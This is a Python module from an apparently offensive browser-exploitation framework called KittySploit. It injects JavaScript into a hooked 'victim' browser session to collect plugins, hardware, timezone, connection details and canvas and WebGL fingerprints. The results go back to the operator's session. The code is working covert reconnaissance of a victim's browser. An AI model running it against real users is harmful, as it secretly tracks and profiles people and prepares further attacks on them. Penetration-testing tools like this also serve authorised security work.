from kittysploit import *
import json
from datetime import datetime

class Module(BrowserAuxiliary):

    __info__ = {
        "name": "Detect Properties",
        "description": "Detect comprehensive properties of the browser victim (plugins, features, fingerprinting data)",
        "author": "KittySploit Team",
        "browser": Browser.ALL,
        "platform": Platform.ALL,
        "session_type": SessionType.BROWSER,
    }

    def run(self):
        """Detect and display browser properties"""
        code_js = """
        (function() {
            const info = {
                // Basic browser info
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages || [navigator.language],
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                
                // Screen properties
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth
                },
                
                // Window properties
                window: {
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight,
                    outerWidth: window.outerWidth,
                    outerHeight: window.outerHeight
                },
                
                // Timezone
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                
                // Features detection
                features: {
                    java: window.navigator.javaEnabled ? window.navigator.javaEnabled() : false,
                    flash: !!(navigator.mimeTypes && navigator.mimeTypes["application/x-shockwave-flash"]),
                    quicktime: false,
                    vbscript: false,
                    activeX: false,
                    webgl: !!window.WebGLRenderingContext,
                    canvas: !!document.createElement('canvas').getContext,
                    localStorage: !!window.localStorage,
                    sessionStorage: !!window.sessionStorage,
                    indexedDB: !!window.indexedDB,
                    geolocation: !!navigator.geolocation,
                    mediaDevices: !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia),
                    serviceWorker: 'serviceWorker' in navigator,
                    webWorker: typeof Worker !== 'undefined',
                    websocket: typeof WebSocket !== 'undefined',
                    webRTC: !!(window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection)
                },
                
                // Plugins
                plugins: [],
                
                // MIME types
                mimeTypes: [],
                
                // Hardware
                hardware: {
                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                    deviceMemory: navigator.deviceMemory || 'unknown',
                    maxTouchPoints: navigator.maxTouchPoints || 0
                },
                
                // Battery API (if available)
                battery: null,
                
                // Connection info (if available)
                connection: null
            };
            
            // Detect QuickTime
            if (navigator.plugins) {
                for (let i = 0; i < navigator.plugins.length; i++) {
                    if (navigator.plugins[i].name.indexOf("QuickTime") >= 0) {
                        info.features.quicktime = true;
                        break;
                    }
                }
            }
            if ((navigator.appVersion.indexOf("Mac") > 0) && 
                (navigator.appName.substring(0, 9) == "Microsoft") && 
                (parseInt(navigator.appVersion) < 5)) {
                info.features.quicktime = true;
            }
            
            // Detect VBScript
            if ((navigator.userAgent.indexOf('MSIE') != -1) && 
                (navigator.userAgent.indexOf('Win') != -1)) {
                info.features.vbscript = true;
            }
            
            // Detect ActiveX
            try {
                const test = new ActiveXObject("WbemScripting.SWbemLocator");
                info.features.activeX = true;
            } catch (ex) {
                info.features.activeX = false;
            }
            
            // List all plugins
            if (navigator.plugins && navigator.plugins.length > 0) {
                for (let i = 0; i < navigator.plugins.length; i++) {
                    const plugin = navigator.plugins[i];
                    const pluginInfo = {
                        name: plugin.name,
                        description: plugin.description,
                        filename: plugin.filename,
                        length: plugin.length
                    };
                    
                    // Get MIME types for this plugin
                    if (plugin.length > 0) {
                        pluginInfo.mimeTypes = [];
                        for (let j = 0; j < plugin.length; j++) {
                            const mimeType = plugin[j];
                            pluginInfo.mimeTypes.push({
                                type: mimeType.type,
                                description: mimeType.description,
                                suffixes: mimeType.suffixes
                            });
                        }
                    }
                    
                    info.plugins.push(pluginInfo);
                }
            }
            
            // List all MIME types
            if (navigator.mimeTypes && navigator.mimeTypes.length > 0) {
                for (let i = 0; i < navigator.mimeTypes.length; i++) {
                    const mimeType = navigator.mimeTypes[i];
                    info.mimeTypes.push({
                        type: mimeType.type,
                        description: mimeType.description,
                        suffixes: mimeType.suffixes,
                        enabledPlugin: mimeType.enabledPlugin ? mimeType.enabledPlugin.name : null
                    });
                }
            }
            
            // Battery API - note: this is async, so we'll try to get it synchronously if possible
            // Most browsers require async, so we'll skip it for now or use a promise
            // For now, we'll just mark if the API is available
            info.batteryApiAvailable = !!navigator.getBattery;
            
            // Connection API
            if (navigator.connection || navigator.mozConnection || navigator.webkitConnection) {
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                info.connection = {
                    effectiveType: conn.effectiveType,
                    downlink: conn.downlink,
                    rtt: conn.rtt,
                    saveData: conn.saveData
                };
            }
            
            // Canvas fingerprinting (simple hash)
            if (info.features.canvas) {
                try {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    ctx.textBaseline = 'top';
                    ctx.font = '14px Arial';
                    ctx.textBaseline = 'alphabetic';
                    ctx.fillStyle = '#f60';
                    ctx.fillRect(125, 1, 62, 20);
                    ctx.fillStyle = '#069';
                    ctx.fillText('KittySploit', 2, 15);
                    info.canvasFingerprint = canvas.toDataURL().substring(0, 50);
                } catch (e) {
                    info.canvasFingerprint = 'error';
                }
            }
            
            // WebGL fingerprinting
            if (info.features.webgl) {
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (gl) {
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        if (debugInfo) {
                            info.webgl = {
                                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                            };
                        }
                    }
                } catch (e) {
                    info.webgl = 'error';
                }
            }
            
            return JSON.stringify(info, null, 2);
        })();
        """
        
        # Execute JavaScript and get result
        result = self.send_js_and_wait_for_response(code_js, timeout=15.0)
        
        if not result:
            print_error("Failed to retrieve browser properties")
            return False
        
        try:
            # Parse JSON result
            data = json.loads(result)
            
            # Display results in a formatted way
            print_info("\n" + "="*80)
            print_success("Browser Properties Detection")
            print_info("="*80)
            
            # Basic Info
            print_info("\n[Basic Information]")
            print_info(f"  User Agent: {data.get('userAgent', 'N/A')}")
            print_info(f"  Platform: {data.get('platform', 'N/A')}")
            print_info(f"  Language: {data.get('language', 'N/A')}")
            print_info(f"  Languages: {', '.join(data.get('languages', []))}")
            print_info(f"  Cookies Enabled: {data.get('cookieEnabled', 'N/A')}")
            print_info(f"  Online: {data.get('onLine', 'N/A')}")
            print_info(f"  Timezone: {data.get('timezone', 'N/A')} (offset: {data.get('timezoneOffset', 'N/A')} min)")
            
            # Screen Info
            screen = data.get('screen', {})
            if screen:
                print_info("\n[Screen Properties]")
                print_info(f"  Resolution: {screen.get('width', 'N/A')}x{screen.get('height', 'N/A')}")
                print_info(f"  Available: {screen.get('availWidth', 'N/A')}x{screen.get('availHeight', 'N/A')}")
                print_info(f"  Color Depth: {screen.get('colorDepth', 'N/A')} bits")
                print_info(f"  Pixel Depth: {screen.get('pixelDepth', 'N/A')} bits")
            
            # Window Info
            window_info = data.get('window', {})
            if window_info:
                print_info("\n[Window Properties]")
                print_info(f"  Inner Size: {window_info.get('innerWidth', 'N/A')}x{window_info.get('innerHeight', 'N/A')}")
                print_info(f"  Outer Size: {window_info.get('outerWidth', 'N/A')}x{window_info.get('outerHeight', 'N/A')}")
            
            # Features
            features = data.get('features', {})
            if features:
                print_info("\n[Features Detection]")
                feature_status = {True: "[+]", False: "[-]"}
                for feature, enabled in features.items():
                    status = feature_status.get(enabled, "[?]")
                    print_info(f"  {status} {feature.replace('_', ' ').title()}")
            
            # Hardware
            hardware = data.get('hardware', {})
            if hardware:
                print_info("\n[Hardware Information]")
                print_info(f"  CPU Cores: {hardware.get('hardwareConcurrency', 'N/A')}")
                print_info(f"  Device Memory: {hardware.get('deviceMemory', 'N/A')} GB")
                print_info(f"  Max Touch Points: {hardware.get('maxTouchPoints', 'N/A')}")
            
            # Plugins
            plugins = data.get('plugins', [])
            if plugins:
                print_info(f"\n[Plugins] ({len(plugins)} found)")
                for plugin in plugins:
                    print_info(f"  • {plugin.get('name', 'Unknown')}")
                    if plugin.get('description'):
                        print_info(f"    Description: {plugin.get('description', 'N/A')}")
                    if plugin.get('mimeTypes'):
                        print_info(f"    MIME Types: {len(plugin.get('mimeTypes', []))}")
            else:
                print_info("\n[Plugins] No plugins detected")
            
            # MIME Types
            mimeTypes = data.get('mimeTypes', [])
            if mimeTypes:
                print_info(f"\n[MIME Types] ({len(mimeTypes)} found)")
                for mime in mimeTypes[:10]:  # Show first 10
                    print_info(f"  • {mime.get('type', 'N/A')}")
                if len(mimeTypes) > 10:
                    print_info(f"  ... and {len(mimeTypes) - 10} more")
            
            # WebGL Info
            if 'webgl' in data and data['webgl']:
                webgl = data['webgl']
                if isinstance(webgl, dict):
                    print_info("\n[WebGL Information]")
                    print_info(f"  Vendor: {webgl.get('vendor', 'N/A')}")
                    print_info(f"  Renderer: {webgl.get('renderer', 'N/A')}")
            
            # Connection Info
            connection = data.get('connection')
            if connection:
                print_info("\n[Connection Information]")
                print_info(f"  Effective Type: {connection.get('effectiveType', 'N/A')}")
                print_info(f"  Downlink: {connection.get('downlink', 'N/A')} Mbps")
                print_info(f"  RTT: {connection.get('rtt', 'N/A')} ms")
                print_info(f"  Save Data: {connection.get('saveData', 'N/A')}")
            
            # Battery API
            if data.get('batteryApiAvailable'):
                print_info("\n[Battery API] Available (requires async call to retrieve data)")
            
            print_info("\n" + "="*80)
            print_success("Detection completed successfully")
            print_info("="*80)
            
            # Store properties in session (fingerprint will be generated separately)
            if self.browser_server and self.session_id:
                session = self.browser_server.get_session(self.session_id)
                if session:
                    if session.fingerprint is None:
                        session.fingerprint = {}
                    session.fingerprint['properties'] = data
                    session.fingerprint['timestamp'] = datetime.now().isoformat()
                    print_success(f"[+] Properties stored for session {self.session_id[:8]}...")
                    print_info("[*] Run 'generate fingerprint' to create a fingerprint hash")
            
            return True
            
        except json.JSONDecodeError as e:
            print_error(f"Failed to parse browser properties: {e}")
            print_info(f"Raw result: {result[:200]}...")
            return False
        except Exception as e:
            print_error(f"Error processing browser properties: {e}")
            return False